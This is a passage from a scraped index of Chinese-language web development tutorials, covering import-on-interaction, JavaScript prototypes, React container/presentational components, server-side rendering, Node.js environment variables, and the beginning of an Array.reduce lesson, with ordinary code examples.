{\rimport(\u0026#39;react-scroll\u0026#39;).then(scroll =\u0026gt; {\rscroll.animateScroll.scrollToTop({\r})\r})\r} \r如何导入交互？ Vanilla JavaScript 在 JavaScript 中，\n动态 import() 启用延迟加载模块并返回承诺，并且在正确应用时可以非常强大。\n下面是在按钮事件侦听器中使用动态导入来导入 lodash.sortby 模块然后使用它的示例。\n1 2 3 4 5 6 7 8 9 10  const btn = document.querySelector(\u0026#39;button\u0026#39;); btn.addEventListener(\u0026#39;click\u0026#39;, e =\u0026gt; { e.preventDefault(); import(\u0026#39;lodash.sortby\u0026#39;) .then(module =\u0026gt; module.default) .then(sortInput()) // 使用导入的依赖  .catch(err =\u0026gt; { console.log(err) }); });   在动态导入或用例之前，它也不适合，\n使用基于 Promise 的脚本加载器将脚本动态注入页面也是一种选择请参阅此处了解演示登录外观的完整实现：\n1 2 3 4 5 6 7 8 9 10 11  const loginBtn = document.querySelector(\u0026#39;#login\u0026#39;); loginBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { const loader = new scriptLoader(); loader.load([ \u0026#39;//apis.google.com/js/client:platform.js?onload=showLoginScreen\u0026#39; ]).then(({length}) =\u0026gt; { console.log(`${length}scripts loaded!`); }); });   1 2 3 4 5 6 7 8 9 10 11  const loginBtn = document.querySelector(\u0026#39;#login\u0026#39;); loginBtn.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { const loader = new scriptLoader(); loader.load([ \u0026#39;//apis.google.com/js/client:platform.js?onload=showLoginScreen\u0026#39; ]).then(({length}) =\u0026gt; { console.log(`${length}scripts loaded!`); }); });   \rReact 假设有一个聊天应用程序，\n它有一个 \u0026lt;MessageList\u0026gt;、\u0026lt;MessageInput\u0026gt; 和一个 \u0026lt;EmojiPicker\u0026gt; 组件（由 emoji-mart 提供支持，它被压缩和压缩为 98KB）。\n在初始页面加载时急切加载所有这些组件是很常见的。\nimport MessageList from \u0026#39;./MessageList\u0026#39;;\rimport MessageInput from \u0026#39;./MessageInput\u0026#39;;\rimport EmojiPicker from \u0026#39;./EmojiPicker\u0026#39;;\rconst Channel = () =\u0026gt; {\r...\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;MessageList /\u0026gt;\r\u0026lt;MessageInput /\u0026gt;\r{emojiPickerOpen \u0026amp;\u0026amp; \u0026lt;EmojiPicker /\u0026gt;}\r\u0026lt;/div\u0026gt;\r);\r}; 使用代码拆分来分解这项工作的加载相对简单。\nReact.lazy 方法可以很容易地使用动态导入在组件级别对 React 应用程序进行代码拆分。\nReact.lazy 函数提供了一种内置方法，可以将应用程序中的组件分离为单独的 JavaScript 块，而且工作量很少。\n当将它与 Suspense 组件结合时，你可以处理加载状态。\n\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import React, { lazy, Suspense } from \u0026#39;react\u0026#39;; import MessageList from \u0026#39;./MessageList\u0026#39;; import MessageInput from \u0026#39;./MessageInput\u0026#39;; const EmojiPicker = lazy( () =\u0026gt; import(\u0026#39;./EmojiPicker\u0026#39;) ); const Channel = () =\u0026gt; { ... return ( \u0026lt;div\u0026gt; \u0026lt;MessageList /\u0026gt; \u0026lt;MessageInput /\u0026gt; {emojiPickerOpen \u0026amp;\u0026amp; ( \u0026lt;Suspense fallback={\u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;}\u0026gt; \u0026lt;EmojiPicker /\u0026gt; \u0026lt;/Suspense\u0026gt; )} \u0026lt;/div\u0026gt; ); };   可以将这个想法扩展为仅在 \u0026lt;MessageInput\u0026gt; 中单击 Emoji 图标时为 Emoji Picker 组件导入代码，而不是在应用程序最初加载时立即执行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import React, { useState, createElement } from \u0026#39;react\u0026#39;; import MessageList from \u0026#39;./MessageList\u0026#39;; import MessageInput from \u0026#39;./MessageInput\u0026#39;; import ErrorBoundary from \u0026#39;./ErrorBoundary\u0026#39;; const Channel = () =\u0026gt; { const [emojiPickerEl, setEmojiPickerEl] = useState(null); const openEmojiPicker = () =\u0026gt; { import(/* webpackChunkName: \u0026#34;emoji-picker\u0026#34; */ \u0026#39;./EmojiPicker\u0026#39;) .then(module =\u0026gt; module.default) .then(emojiPicker =\u0026gt; { setEmojiPickerEl(createElement(emojiPicker)); }); }; const closeEmojiPickerHandler = () =\u0026gt; { setEmojiPickerEl(null); }; return ( \u0026lt;ErrorBoundary\u0026gt; \u0026lt;div\u0026gt; \u0026lt;MessageList /\u0026gt; \u0026lt;MessageInput onClick={openEmojiPicker} /\u0026gt; {emojiPickerEl} \u0026lt;/div\u0026gt; \u0026lt;/ErrorBoundary\u0026gt; ); };   \r第一部分代码的交互导入作为渐进加载的一部分 在交互中加载代码也恰好是谷歌如何在航班和照片等大型应用程序中处理渐进式加载的关键部分。\n为了说明这一点，看一下一个例子。\n假设用户计划去印度孟买旅行，他们访问 Google Hotels 查看价格。 此交互所需的所有资源都可以预先加载，但如果用户未选择任何目的地，则地图所需的 HTML/CSS/JS 将是不必要的。\n在最简单的下载场景中，假设 Google Hotels 正在使用简单的客户端渲染 (CSR)。\n所有代码都将被预先下载和处理：HTML，然后是 JS、CSS，然后获取数据，只有在拥有所有内容后才进行渲染。\n然而，这让用户等待很长时间，屏幕上没有显示任何内容。 大部分 JavaScript 和 CSS 可能是不必要的。\n接下来，想象一下将这种体验转移到服务器端渲染 (SSR) 的情况。\n允许用户更快地获得一个视觉上完整的页面，这很好，但是直到从服务器获取数据并且客户端框架完成水合之前它不会是交互式的。\nSSR 可以是一种改进，但用户可能会有一种不可思议的山谷体验，页面看起来已经准备好了，但他们无法点击任何东西。\n有时这被称为愤怒点击，因为用户往往会沮丧地反复点击。\n回到 Google Hotels 搜索示例，如果稍微放大 UI，可以看到，当用户单击“更多过滤器”以准确找到合适的酒店时，会下载该组件所需的代码。\n最初只下载非常少的代码，除此之外，用户交互决定了何时发送哪些代码。\n仔细看看这个加载场景。\n交互驱动的延迟加载有许多重要方面：\n  首先，最初下载最少的代码，因此页面在视觉上很快就完成了。\n  接下来，当用户开始与页面交互时，使用这些交互来确定要加载哪些其他代码。 例如加载“更多过滤器”组件的代码。\n  这意味着页面上许多功能的代码永远不会发送到浏览器，因为用户不需要使用它们。\n  如何避免丢失早期点击？\n在这些 Google 团队使用的框架堆栈中，我们可以及早跟踪点击次数，因为 HTML 的第一块包含一个小型事件库 (JSAction)，它在框架启动之前跟踪所有点击次数。\n这些事件用于两件事：\n  基于用户交互触发组件代码下载\n  当框架完成引导时重放用户交互\n  可以使用的其他潜在启发式方法包括加载组件代码：\n  空闲时间后的一段时间\n  用户将鼠标悬停在相关的 UI/按钮/号召性用语上\n  基于基于浏览器信号（例如网络速度、数据保护模式等）的热切程度\n  数据呢？\n用于呈现页面的初始数据包含在初始页面的 SSR HTML 中并进行流式传输。 延迟加载的数据是根据用户交互下载的，因为我们知道它与哪个组件一起使用。\n这完成了交互导入图片，数据获取工作类似于 CSS 和 JS 的功能。 由于组件知道它需要什么代码和数据，因此它的所有资源永远不会超过一个请求。\n这在构建期间创建组件及其依赖关系图时起作用。 Web 应用程序能够在任何时候引用此图并快速获取任何组件所需的资源（代码和数据）。 这也意味着我们基于组件而不是路由进行代码拆分。\n有关上述示例的演练，请参阅通过 JavaScript 社区提升 Web 平台。\n\r权衡 将昂贵的工作转移到更接近用户交互的位置可以优化页面最初加载的速度，但是该技术并非没有折衷。\n如果用户点击后加载脚本需要很长时间会发生什么？\n在 Google Hotels 示例中，小粒度块最大限度地减少了用户等待代码和数据获取和执行时间过长的机会。 在其他一些情况下，较大的依赖性可能确实会在较慢的网络上引入这种担忧。\n减少这种情况发生的一种方法是在页面中的关键内容加载完成后更好地中断加载或预取这些资源。 鼓励衡量这种影响，以确定它在您的应用程序中的真实应用程序。\n在用户交互之前缺乏功能怎么办？\n外观的另一个权衡是在用户交互之前缺乏功能。 例如，嵌入式视频播放器将无法自动播放媒体。 如果此类功能很重要，您可能会考虑加载资源的替代方法，例如在用户上延迟加载这些第三方 iframe，将它们滚动到视图中，而不是将加载推迟到交互。\n\r用静态变体替换交互式嵌入 我们已经讨论了交互导入模式和渐进式加载，但是对于嵌入用例完全静态如何？\n在某些情况下，可能会立即需要来自嵌入的最终渲染内容，例如在初始视口中可见的社交媒体帖子。\n当嵌入带来 2-3MB 的 JavaScript 时，这也会带来它自己的挑战。 由于需要立即嵌入内容，因此延迟加载和外观可能不太适用。\n如果优化性能，则可以使用看起来相似的静态变体完全替换嵌入，链接到更具交互性的版本（例如原始社交媒体帖子）。 在构建时，嵌入的数据可以被拉入并转换为静态 HTML 版本。\n这是@wongmjane 在他们的博客上为一种社交媒体嵌入所采用的方法，既提高了页面加载性能，又消除了由于嵌入代码增强了后备文本而导致布局偏移而导致的累积布局偏移。\n虽然静态替换对性能有好处，但它们通常需要做一些自定义的事情，因此在评估您的选项时请记住这一点。\n\r结论 第一部分 JavaScript 通常会影响 Web 上现代页面的交互准备情况，但它通常会在来自保持主线程忙碌的第一方或第三方源的非关键 JS 后面的网络上延迟。\n一般情况下，避免在文档头部同步第三方脚本，目的是在第一方 JS 加载完成后加载非阻塞的第三方脚本。 交互时导入等模式为我们提供了一种方法，可以将非关键资源的加载推迟到用户更有可能需要他们支持的 UI 时。\n\r知识点   preview\n  React.lazy\n  Suspense\n  ","description":"当用户与需要与 UI 交互时加载非关键资源","id":89,"section":"react-patterns","tags":null,"title":"交互导入","uri":"https://codthing.github.io/react-patterns/performance-patterns/import-on-interaction/"},{"content":"原型模式是一种在许多相同类型的对象之间共享属性的有用方法。 原型prototype是 JavaScript 原生的对象，对象可以通过原型链__proto__访问。\n在应用程序中，我们经常需要创建许多相同类型的对象。 一个有用的方法是创建一个 ES6 类的多个实例。\n假设我们想创造很多狗！ 在我们的例子中，狗不能做很多事：它们只有一个名字，而且它们可以吠叫！\n\r类 class 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Dog { constructor(name) { this.name = name; } bark() { return `Woof!`; } } const dog1 = new Dog(\u0026#34;Daisy\u0026#34;); const dog2 = new Dog(\u0026#34;Max\u0026#34;); const dog3 = new Dog(\u0026#34;Spot\u0026#34;); console.log(dog1.name); //Daisy console.log(dog2.name); //Max console.log(dog3.name); //Spot   \r原型 prototype 请注意，构造函数如何包含 name 属性，而类本身包含 bark 属性。 使用 ES6 类时，在类本身上定义的所有属性（在本例中为 bark）都会自动添加到原型prototype中。\n可以通过访问构造函数上的 prototype 属性直接查看原型，或者通过任何实例上的 __proto__ 属性。\n1 2 3 4 5 6  console.log(Dog.prototype); // constructor: ƒ Dog(name, breed) bark: ƒ bark()  console.log(dog1.__proto__); // constructor: ƒ Dog(name, breed) bark: ƒ bark()   __proto__ 在构造函数的任何实例上的值，是对构造函数原型的直接引用！ 每当我们尝试直接访问对象上不存在的属性时，JavaScript 将沿着原型链向下查看该属性是否在原型链中可用。\n在处理应该可以访问相同属性的对象时，原型模式非常强大。 可以简单地将属性添加到原型，而不是每次都创建属性的副本，因为所有实例都可以访问原型对象。\n由于所有实例都可以访问原型，因此即使在创建实例之后，也可以轻松地向原型添加属性。\n狗不仅应该会吠，还应该会玩！可以通过向原型添加 play 属性来实现这一点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Dog { constructor(name) { this.name = name; } bark() { return `Woof!`; } } const dog1 = new Dog(\u0026#34;Daisy\u0026#34;); const dog2 = new Dog(\u0026#34;Max\u0026#34;); const dog3 = new Dog(\u0026#34;Spot\u0026#34;); Dog.prototype.play = () =\u0026gt; console.log(\u0026#34;Playing now!\u0026#34;); dog1.play(); //Playing now!   \r原型链 __proto__ 原型链表示可能不止一个步骤。 的确！ 到目前为止，我们只看到了如何访问在 __proto__ 引用的第一个对象上直接可用的属性。 然而，原型本身也有一个 __proto__ 对象！\n让我们创造另一种类型的狗，超级狗！ 这只狗应该继承普通狗的一切，但它也应该会飞。 我们可以通过扩展 Dog 类并添加 fly 方法来创建超级狗。\nclass SuperDog extends Dog {\rconstructor(name) {\rsuper(name);\r}\rfly() {\rreturn \u0026#34;Flying!\u0026#34;;\r}\r} 让我们创造一只名叫“Daisy”的飞狗，让她吠叫飞翔！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  class Dog { constructor(name) { this.name = name; } bark() { console.log(\u0026#34;Woof!\u0026#34;); } } class SuperDog extends Dog { constructor(name) { super(name); } fly() { console.log(`Flying!`); } } const dog1 = new SuperDog(\u0026#34;Daisy\u0026#34;); dog1.bark(); //Woof! dog1.fly(); //Flying!   我们可以访问 bark 方法，因为我们扩展了 Dog 类。 SuperDog 原型上 proto 的值指向 Dog.prototype 对象！\n很清楚为什么它被称为原型链：当我们尝试访问对象上不直接可用的属性时，JavaScript 会递归地遍历 __proto__ 指向的所有对象，直到找到该属性！\n\rObject.create Object.create 方法让我们可以创建一个新对象，我们可以将其原型的值显式传递给该对象。\nconst dog = {\rbark() {\rreturn `Woof!`;\r}\r};\rconst pet1 = Object.create(dog); 虽然 pet1 本身没有任何属性，但它确实可以访问其原型链__proto__上的属性！ 由于我们将 dog 对象作为 pet1 的原型prototype传递，因此我们可以访问 bark 属性。\n1 2 3 4 5 6 7 8 9 10 11 12  const dog = { bark() { console.log(`Woof!`); } }; const pet1 = Object.create(dog); pet1.bark(); // Woof! console.log(\u0026#34;pet1 上的原型prototype属性: \u0026#34;, Object.keys(pet1)); // pet1 上的直接原型prototype属性: [] console.log(\u0026#34;pet1 原型链__proto__的属性: \u0026#34;, Object.keys(pet1.__proto__)); // pet1 原型链__proto__的属性：[\u0026#34;bark\u0026#34;]   Perfect! Object.create 是一种让对象直接从其他对象继承属性的简单方法，通过指定新创建的对象的原型prototype。 新对象可以通过沿着原型链__proto__访问新属性。\n\r优点 原型模式允许我们轻松地让对象访问和继承其他对象的属性。\n由于原型链允许我们访问未直接定义在对象本身上的属性，我们可以避免方法和属性的重复，从而减少使用的内存量。\n\r知识点  prototype 对象/类本身的属性 __proto__ 原型链上的属性 new 将类实例化为一个对象 extends 类继承 Object.create 创建一个新对象  ","description":"在许多相同类型的对象之间共享属性","id":90,"section":"react-patterns","tags":null,"title":"原型模式","uri":"https://codthing.github.io/react-patterns/design-patterns/prototype-pattern/"},{"content":"这是历史遗留问题，所以不建议使用（现在有了Hooks），在这里只是让我们了解这段历史\n在 React 中，一种强制分离关注点的方法是通过使用容器/演示模式。使用这种模式，我们可以将视图与应用程序逻辑分开。\n\r在 React 中，强制分离关注点的一种方法是使用 Container/Presentational 模式。 使用这种模式，我们可以将视图与应用程序逻辑分开。\n假设我们要创建一个应用程序来获取 6 个狗的图像，并将这些图像呈现在屏幕上。\n理想情况下，我们希望通过将此过程分为两部分来强制分离关注点：\n 展示组件：关心如何向用户显示数据的组件。 在这个例子中，这是渲染狗图像列表。 容器组件：关心向用户显示什么数据的组件。 在这个例子中，这是获取狗的图像。  容器组件 获取狗图像处理应用程序逻辑，而 展示组件 只处理视图。\n\r展示组件 一个展示组件通过 props 接收它的数据。 它的主要功能是简单地以我们希望的方式显示它接收到的数据，包括样式，而不修改该数据。\n让我们看一下显示狗图像的示例。 在渲染狗图像时，我们只想映射从 API 获取的每个狗图像，并渲染这些图像。 为此，可以创建一个功能组件，通过 props 接收数据，并渲染它接收到的数据。\n1 2 3 4 5  //展示组件 DogImages.js export default function DogImages({ dogs }) { return dogs.map((dog, i) =\u0026gt; \u0026lt;img src={dog} key={i} alt=\u0026#34;Dog\u0026#34; /\u0026gt;); }   \r容器组件 容器组件的主要功能是将数据传递给它们包含的表示组件。 除了关心其数据的展示组件之外，容器组件本身通常不会渲染任何其他组件。 因为它们自己不渲染任何东西，所以它们通常也不包含任何样式。\n在示例中，我们希望将狗图像传递给 DogsImages 展示组件。 在能够这样做之前，需要从外部 API 获取图像。\n需要创建一个容器组件来获取这些数据，并将这些数据传递给展示组件 DogImages 以便在屏幕上显示它。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //容器组件 DogImagesContainer.js import React from \u0026#34;react\u0026#34;; import DogImages from \u0026#34;./DogImages\u0026#34;; export default class DogImagesContainer extends React.Component { constructor() { super(); this.state = { dogs: [] }; } componentDidMount() { fetch(\u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;) .then(res =\u0026gt; res.json()) .then(({ message }) =\u0026gt; this.setState({ dogs: message })); } render() { return \u0026lt;DogImages dogs={this.state.dogs} /\u0026gt;; } }   \r将组件渲染到页面中 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //将组件渲染到页面中 import React from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import DogImagesContainer from \u0026#34;./DogImagesContainer\u0026#34;; import \u0026#34;./styles.css\u0026#34;; function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;h1\u0026gt; Browse Dog Images{\u0026#34; \u0026#34;} \u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt; 🐕 \u0026lt;/span\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;DogImagesContainer /\u0026gt; \u0026lt;/div\u0026gt; ); } render(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;));   \rHooks 在很多情况下，Container/Presentational 模式可以用 React Hooks 代替。 Hooks 的引入使开发人员可以轻松添加状态，而无需容器组件来提供该状态。\n我们可以创建一个自定义钩子来获取图像并返回狗的数组，而不是在 DogImagesContainer 组件中使用数据获取逻辑。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //自定义hook useDogImages.js import { useState, useEffect } from \u0026#34;react\u0026#34;; export default function useDogImages() { const [dogs, setDogs] = useState([]); useEffect(() =\u0026gt; { fetch(\u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;) .then(res =\u0026gt; res.json()) .then(({ message }) =\u0026gt; setDogs(message)); }, []); return dogs; }   通过使用这个钩子，不再需要包装 DogImagesContainer 容器组件来获取数据，并将其发送到展示的 DogImages 组件。\n相反，我们可以直接在 DogImages 组件中使用这个钩子！\n1 2 3 4 5 6 7 8 9  //展示组件 DogImages.js import useDogImages from \u0026#34;./useDogImages\u0026#34;; export default function DogImages() { const dogs = useDogImages(); return dogs.map((dog, i) =\u0026gt; \u0026lt;img src={dog} key={i} alt=\u0026#34;Dog\u0026#34; /\u0026gt;); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //将展示组件渲染到页面 import React from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import DogImages from \u0026#34;./DogImages\u0026#34;; import \u0026#34;./styles.css\u0026#34;; function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;h1\u0026gt; Browse Dog Images{\u0026#34; \u0026#34;} \u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt; 🐕 \u0026lt;/span\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;DogImages /\u0026gt; \u0026lt;/div\u0026gt; ); } render(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;));   通过使用 useDogImages 钩子，我们仍然将应用程序逻辑与视图分离。 我们只是使用从 useDogImages 钩子返回的数据，而没有在 DogImages 组件中修改该数据。\n钩子可以很容易地分离组件中的逻辑和视图，就像容器/展示模式一样。 它为我们节省了将展示组件包装在容器组件中所需的额外层。\n\r优点 使用容器/展示模式有很多好处。\nContainer/Presentational 模式鼓励关注点分离。\n展示组件可以是负责 UI 的纯函数，而容器组件则负责应用程序的状态和数据。这使得实施关注点分离变得容易。\n展示组件很容易重用，因为它们只是显示数据而不改变这些数据。可以为不同的目的在整个应用程序中重用展示组件。\n由于展示组件不会改变应用程序逻辑，因此不了解代码库的人（例如设计人员）可以轻松更改表示组件的外观。\n如果在应用程序的许多部分重用了展示组件，则更改可以在整个应用程序中保持一致。\n测试展示组件很容易，因为它们通常是纯函数。我们知道组件将根据我们传递的数据呈现什么，而无需模拟数据存储。\n\r缺点 Container/Presentational 模式可以轻松地将应用程序逻辑与呈现逻辑分开。 但是，Hooks 可以实现相同的结果，而无需使用容器/展示模式，也无需将无状态功能组件重写为类组件。\n尽管我们仍然可以使用容器/展示模式，甚至使用 React Hooks，但这种模式在较小规模的应用程序中很容易成为一种矫枉过正。\n\r知识点  纯函数展示组件 自定义hooks  ","description":"通过将视图与应用程序逻辑分离来强制分离关注点","id":91,"section":"react-patterns","tags":null,"title":"容器/展示模式（X）","uri":"https://codthing.github.io/react-patterns/design-patterns/presentational-container-pattern/"},{"content":"服务器端渲染 (SSR) 是最古老的 Web 内容渲染方法之一。\nSSR 为要呈现的页面内容生成完整的 HTML，以响应用户请求。\n内容可能包括来自数据存储或外部 API 的数据。\n\r连接和获取操作在服务器上处理。 格式化内容所需的 HTML 也会在服务器上生成。\n因此，使用 SSR，可以避免为数据获取和模板制作额外的往返行程。\n因此，客户端不需要渲染代码，并且不需要将与此对应的 JavaScript 发送到客户端。\n使用 SSR，每个请求都被独立处理，并将被服务器作为新请求处理。\n即使连续两次请求的输出差别不大，服务器也会从头开始处理生成。\n由于服务器是多个用户共用的，因此处理能力在给定时间由所有活动用户共享。\n\r经典 SSR 实现 让我们看看如何使用经典的 SSR 和 JavaScript 创建一个页面来显示当前时间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Time\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;Hello, world!\u0026lt;/h1\u0026gt; \u0026lt;b\u0026gt;It is \u0026lt;div id=currentTime\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; //index.js function tick() { var d = new Date(); var n = d.toLocaleTimeString(); document.getElementById(\u0026#34;currentTime\u0026#34;).innerHTML = n; } setInterval(tick, 1000);   请注意这与提供相同输出的 CSR 代码有何不同。\n另请注意，虽然 HTML 由服务器呈现，但此处显示的时间是由 JavaScript 函数 tick() 填充的客户端本地时间。\n如果要显示服务器特定的任何其他数据，例如服务器时间，则需要在呈现之前将其嵌入 HTML 中。\n这意味着它不会在没有往返服务器的情况下自动刷新。\n\r优缺点 在服务器上执行渲染代码并减少 JavaScript 具有以下优点。\n较少的 JavaScript 导致更快的 FCP 和 TTI\n在页面上有多个 UI 元素和应用程序逻辑的情况下，与 CSR 相比，SSR 的 JavaScript 少得多。\n因此加载和处理脚本所需的时间更少。\nFP、FCP 和 TTI 较短且 FCP = TTI。\n使用 SSR，用户将不会等待所有屏幕元素出现并使其具有交互性。\n为客户端 JavaScript 提供额外预算\n开发团队需要使用 JS 预算来限制页面上的 JS 数量，以实现所需的性能。\n使用 SSR，由于直接消除了呈现页面所需的 JS，因此它为应用程序可能需要的任何第三方 JS 创造了额外的空间。\n启用搜索引擎优化\n搜索引擎爬虫可以轻松抓取 SSR 应用程序的内容，从而确保页面上的搜索引擎优化更高。\n由于上述优点，SSR 非常适合静态内容。 但是，它确实有一些缺点，因此它并不适合所有场景。\n慢速 TTFB\n由于所有处理都在服务器上进行，在以下一种或多种情况下，服务器的响应可能会延迟\n  多个并发用户导致服务器负载过大\n  网速慢\n  服务器代码未优化\n  某些交互需要重新加载整页\n由于客户端上的所有代码都不可用，因此所有导致整个页面重新加载的关键操作都需要频繁地往返于服务器。\n这可能会增加交互之间的时间，因为用户需要在操作之间等待更长时间。 因此，SSR 无法实现单页应用程序。\n为了解决这些缺点，现代框架和库允许在服务器和客户端上为同一应用程序进行渲染。\n我们将在以下部分详细介绍这些内容。\n首先，让我们看看 Next.js 的一种更简单的 SSR 形式。\n\r使用 Next.js 的 SSR Next.js 框架也支持 SSR。\n这会在每次请求时在服务器上预渲染一个页面。\n它可以通过从页面导出一个名为 getServerSideProps() 的异步函数来完成，如下所示。\n1 2 3 4 5 6  export async function getServerSideProps(context) { return { props: {}, // 将作为道具传递给页面组件  } }   上下文对象包含 HTTP 请求和响应对象、路由参数、查询字符串、区域设置等的键。\n以下实现显示了使用 getServerSideProps() 在使用 React 格式化的页面上呈现数据。\n完整的实现在这里。\n服务器的 React React 可以同构渲染，这意味着它既可以在浏览器上运行，也可以在服务器等其他平台上运行。 因此，可以使用 React 在服务器上呈现 UI 元素。\nReact 还可以与通用代码一起使用，这将允许相同的代码在多个环境中运行。 这是通过在服务器上使用 Node.js 或所谓的 Node 服务器来实现的。 因此，通用 JavaScript 可用于在服务器上获取数据，然后使用同构 React 进行渲染。\n让我们看看使这成为可能的 React 函数。\nReactDOMServer.renderToString(element) 这个函数返回一个对应于 React 元素的 HTML 字符串。 然后可以将 HTML 呈现给客户端以加快页面加载速度。\nrenderToString() 函数可以与 ReactDOM.hydrate() 一起使用。 这将确保呈现的 HTML 原样保留在客户端上，并且仅在加载后附加事件处理程序。\n为了实现这一点，我们在客户端和服务器上使用与每个页面对应的 .js 文件。 服务器上的 .js 文件将呈现 HTML 内容，客户端上的 .js 文件将其水合。\n假设您有一个名为 App 的 React 元素，其中包含在通用 app.js 文件中定义的要呈现的 HTML。 服务器端和客户端 React 都可以识别 App 元素。\n服务器上的 ipage.js 文件可以有以下代码：\napp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\rconst app = ReactDOMServer.renderToString(\u0026lt;App /\u0026gt;);\r}) 现在可以使用常量 App 来生成要呈现的 HTML。\n客户端的 ipage.js 将有以下内容，以确保元素 App 是水合的。\nReactDOM.hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;)); 可以在此处找到带有 React 的 SSR 的完整示例。\n\r知识点  FP FCP TTI SEO 同构渲染 ReactDOMServer.renderToString(element) 通用 JavaScript ReactDOM.hydrate() 水合  ","description":"生成 HTML 以响应用户请求在服务器上呈现","id":92,"section":"react-patterns","tags":null,"title":"服务端渲染","uri":"https://codthing.github.io/react-patterns/render-patterns/server-side-rendering/"},{"content":"Node.js 的流程核心模块提供 env 属性，该属性托管在流程启动时设置的所有环境变量。\n一、设置变量（测试环境） 下面的代码运行 app.js 并设置 USER_ID 和 USER_KEY。\n1 2  USER_ID=239482 USER_KEY=foobar node app.js   这将传递用户 USER_ID: 239482 和 USER_KEY: foobar。 这适用于测试，但是对于生产，可能会配置一些 bash 脚本来导出变量。\n\r二、设置多个变量（生产环境） 如果 node 项目中有多个环境变量，可以在项目根目录下创建一个 .env 文件，然后在运行时使用 dotenv 包来加载它们。\n1 2 3 4 5  // .env file USER_ID=\u0026#34;239482\u0026#34; USER_KEY=\u0026#34;foobar\u0026#34; NODE_ENV=\u0026#34;development\u0026#34;   \r三、读取变量 1 2 3 4 5 6  require(\u0026#39;dotenv\u0026#39;).config(); process.env.USER_ID // \u0026#34;239482\u0026#34; process.env.USER_KEY // \u0026#34;foobar\u0026#34; process.env.NODE_ENV // \u0026#34;development\u0026#34;   ","description":"","id":93,"section":"nodejs","tags":null,"title":"读取环境变量","uri":"https://codthing.github.io/nodejs/nodebase/node-var/"},{"content":"reduce() 方法按顺序在数组的每个元素上执行用户提供的“reducer”回调函数，并传入对前一个元素进行计算的返回值。 在数组的所有元素上运行 reducer 的最终结果是单个值。\n\r使用 reduce 方法分析数据 reduce()（即Array.prototype.reduce()），是 JavaScript 所有数组操作中最常用的方法。\n几乎可以用 reduce 方法解决所有数组处理问题。\nreduce 方法是处理数组更通用的方式，而且 filter 和 map 方法都可以当作是 reduce 的特殊实现。\nreduce 方法遍历数组中的每个项目并返回单个值（即字符串、数字、对象、数组）。 这是通过在每次迭代中调用一个回调函数来实现的。\n回调函数接受四个参数。\n  第一个参数称为叠加器，它是上一次迭代中回调函数的返回值\n  第二个参数是当前正在处理的数组元素\n  第三个参数是该参数的索引\n  第四个参数是在其上调用 reduce 方法的数组。\n  除了回调函数，reduce 还有一个额外的参数做为叠加器的初始值。 如果没有第二个参数，会跳过第一次迭代，第二次迭代给叠加器传入数组的第一个元素。\n示例1：\n给 users 数组使用 reduce 方法，返回所有用户数组的和。 为了简化，例子仅使用了回调函数的第一个参数和第二个参数。\n1 2 3 4 5 6 7 8 9  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const sumOfAges = users.reduce((sum, user) =\u0026gt; sum + user.age, 0); console.log(sumOfAges); // 64   示例2：\n返回一个包含用户名称做为属性，其年龄做为值的对象。\n1 2 3 4 5 6 7 8 9 10 11 12  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const usersObj = users.reduce((obj, user) =\u0026gt; { obj[user.name] = user.age; return obj; }, {}); console.log(usersObj); // { John: 34, Amy: 20, camperCat: 10 }   更复杂的例子：\nwatchList 是包含一些电影信息的对象。 使用 reduce 查找由 Christopher Nolan 导演的电影的 IMDB 评级平均值。 回想一下之前的例子，如何 filter 数据，以及使用 map 来获取你想要的数据。 可能需要创建其他变量，并从 getRating 函数返回平均评分。 请注意，评级在对象中是字符串，需要将其转换为数字再用于数学运算。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 